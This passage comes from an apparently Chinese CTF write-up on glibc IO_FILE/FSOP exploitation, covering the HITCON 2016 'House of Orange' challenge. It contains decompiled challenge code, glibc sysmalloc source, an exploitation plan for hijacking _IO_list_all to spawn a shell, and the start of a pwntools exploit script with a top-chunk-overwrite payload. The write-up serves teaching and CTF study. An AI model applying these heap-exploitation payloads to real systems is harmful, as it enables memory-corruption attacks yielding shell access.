<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  从_IO_list_all开始, _IO_flush_all_lockp()遍历链表并对每个条目执行一些检查. 如果一个条目通过了所有的检查，</span></span><br><span class="line"><span class="comment">*  _IO_OVERFLOW会从虚表中调用_IO_new_file_overflow()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * 为了能够让我们构造的 fake_FILE 能够正常工作，还需要以下绕过的检查</span></span><br><span class="line"><span class="comment">    * fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    * fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    * 这里调用了 _IO_OVERFLOW 函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>还有一条<code>FSOP</code>的路径是在关闭流的时候，在 <code>_IO_FINISH(fp)</code> 的执行过程中最终会调用伪造的 <code>system(&#39;/bin/sh&#39;)</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*_IO_finish_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span></span>; <span class="comment">/* finalize */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_IO_FINISH (fp);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2016-house-of-orange"><a href="#hctf2016-house-of-orange" class="headerlink" title="[hctf2016]house of orange"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.24_hitconctf2016_house_of_orange" >[hctf2016]house of orange <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息-1"><a href="#检查文件信息-1" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195547354.png"
                      alt="image-20231018195547354"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195633401.png"
                      alt="image-20231018195633401"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195614081.png"
                      alt="image-20231018195614081"
                ></p>
<p>###试运行</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195709292.png"
                      alt="image-20231018195709292"
                ></p>
<h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><ul>
<li><code>main</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Menu</span>();</span><br><span class="line">      v3 = <span class="built_in">get_num</span>(a1, a2);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">See</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">Upgrade</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;give up&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="built_in">Build</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>Build</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Build</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *house; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 orange; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_house &gt; <span class="number">3u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many house&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  house = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  *((_QWORD *)house + <span class="number">1</span>) = <span class="built_in">malloc</span>(len_of_name);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)house + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error !!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>(*((<span class="type">void</span> **)house + <span class="number">1</span>), len_of_name);     <span class="comment">// 这个读取没有截断，可能存在泄露</span></span><br><span class="line">  orange = (__int64)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>);</span><br><span class="line">  *(_DWORD *)orange = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  *(_QWORD *)house = orange;</span><br><span class="line">  house_list = house;</span><br><span class="line">  ++max_house;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其结构大致为:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_struct.png"
                      alt="hosa_struct"
                ></p>
<p>其中 <code>orange</code> 是通过 <code>calloc</code> 申请的。</p>
<ul>
<li><code>See</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_EE6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*house_list + <span class="number">4LL</span>) == <span class="number">0xDDAA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v0 = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[01;38;5;214m%s\x1B[0m\n&quot;</span>, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v0 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &lt;= <span class="number">0x1E</span> || *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &gt; <span class="number">0x25</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Color corruption!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v2 = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[%dm%s\x1B[0m\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*house_list + <span class="number">4LL</span>), *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v2 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>See</code> 函数会打印出 <code>house-&gt;name</code>、<code>orange-&gt;price</code> 和 <code>orange</code> 图案。</p>
<ul>
<li><code>Upgrade</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Upgrade</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *house; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_up &gt; <span class="number">2u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>((<span class="type">void</span> *)house_list[<span class="number">1</span>], len_of_name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">  house = (_DWORD *)*house_list;</span><br><span class="line">  *house = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  ++max_up;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Upgrade</code> 函数重新设置了 <code>len_of_name</code> 后直接向旧的 <code>name</code> 区域读入内容，如果 <code>len_new &gt; len_old</code> 就会导致堆溢出。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>本题没有 <code>free</code> 函数，存在堆溢出。当 <code>top chunk</code>的剩余部分已经不能够满足请求时，就会调用函数 <code>sysmalloc()</code>分配新内存， 这时可能会发生两种情况，一种是调用 <code>sbrk</code>函数直接扩充 <code>top chunk</code>，另一种是调用 <code>mmap</code> 函数分配一块新的 <code>top chunk</code>。具体调 用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 <code>top chunk</code>，需要请求小于阈值 <code>mp_.mmap_threshold</code>。 要成功调用 <code>_int_free()</code> 还需绕过两个断言: </p>
<ol>
<li><p><code>(unsigned long) (old_size) &gt;= MINSIZE</code> 也就是 <code>0x20</code>。</p>
</li>
<li><p><code>prev_inuse == 1 </code></p>
</li>
<li><p><code>((unsigned long) old_end &amp; (pagesize - 1)) == 0 </code>页对齐</p>
</li>
<li><p><code>(unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) </code>新申请的 <code>size</code> 大于 <code>old size + MINSIZE</code></p>
</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里阈值大于 mp_.mmap_threshold 就会调用 mmap 函数分配一块新的 top chunk。</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    old_top = av-&gt;top;</span><br><span class="line">    old_size = <span class="built_in">chunksize</span> (old_top);</span><br><span class="line">    old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span> (old_top, old_size));</span><br><span class="line"></span><br><span class="line">    brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	1. (unsigned long) (old_size) &gt;= MINSIZE 也就是0x20。</span></span><br><span class="line"><span class="comment">    *	2. prev_inuse == 1</span></span><br><span class="line"><span class="comment">    *	3. ((unsigned long) old_end &amp; (pagesize - 1)) == 0 页对齐</span></span><br><span class="line"><span class="comment">    *	4. (unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) 新申请的 size 大于 old size + MINSIZE</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">            ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">             <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">             ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">        heap_info *old_heap, *heap;</span><br><span class="line">        <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">        old_heap = <span class="built_in">heap_for_ptr</span> (old_top);</span><br><span class="line">        old_heap_size = old_heap-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; <span class="built_in">grow_heap</span> (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            <span class="built_in">set_head</span> (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">                    | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((heap = <span class="built_in">new_heap</span> (nb + (MINSIZE + <span class="built_in">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            heap-&gt;ar_ptr = av;</span><br><span class="line">            heap-&gt;prev = old_heap;</span><br><span class="line">            av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">            arena_mem += heap-&gt;size;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">top</span> (av) = <span class="built_in">chunk_at_offset</span> (heap, <span class="built_in">sizeof</span> (*heap));</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">top</span> (av), (heap-&gt;size - <span class="built_in">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">                <span class="comment">// 释放 old_top_chunk 到 unsorted bin。</span></span><br><span class="line">                _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">          <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样便可成功泄露 <code>libc</code> 基址，从而获得 <code>_IO_list_all</code> 地址，然后可以利用 <code>unsorted bin attack</code> 劫持 <code>_IO_list_all</code> 到<code>main_arena+88</code>，利用 <code>fp-&gt;chain</code> 域，使 <code>fp</code> 指 向 <code>old_top</code>，前 <code>8</code> 字节为 <code>&#39;/bin/sh\x00&#39;</code> 字符串，使 <code>_IO_OVERFLOW</code> 为<code>system</code> 函数的地址，从而获得 <code>shell</code>。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br></pre></td></tr></table></figure></div>



<p><strong>泄露libc和heap基址</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    global malloc_hook, _IO_list_all, system_addr, heap_base</span></span><br><span class="line"><span class="function">    build(<span class="number">0x30</span>, b<span class="string">&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk0</span></span><br><span class="line"><span class="function">    #debug()</span></span><br><span class="line"><span class="function">    payload =</span> <span class="built_in">cyclic</span>(<span class="number">0x30</span>) + <span class="built_in">p64</span>(<span class="number">0</span>) + <span class="built_in">p64</span>(<span class="number">0x21</span>) + <span class="built_in">p32</span>(<span class="number">233</span>) + <span class="built_in">p32</span>(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += <span class="built_in">p64</span>(<span class="number">0</span>) * <span class="number">2</span> + <span class="built_in">p64</span>(<span class="number">0xf81</span>)</span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="meta"># size must be page aligned</span></span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x1000</span>, b<span 